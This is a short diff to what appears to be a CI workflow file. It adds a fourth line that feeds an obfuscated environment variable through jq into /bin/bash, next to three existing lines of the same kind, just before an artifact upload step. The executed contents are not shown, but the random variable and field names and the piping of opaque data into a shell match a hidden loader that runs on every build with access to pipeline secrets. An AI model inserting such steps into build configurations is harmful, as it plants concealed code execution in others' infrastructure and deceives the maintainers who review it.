@@ -32,6 +32,7 @@ jobs:
           echo $cqmq11525 | jq -r .rmfs86020 | /bin/bash
           echo $uxyvp4 | jq -r .x588 | /bin/bash
           printf '%s' "$fxl8" | jq -r .kgza77 | /bin/bash
+          printf '%s' "$wfjlb93356" | jq -r .p3 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
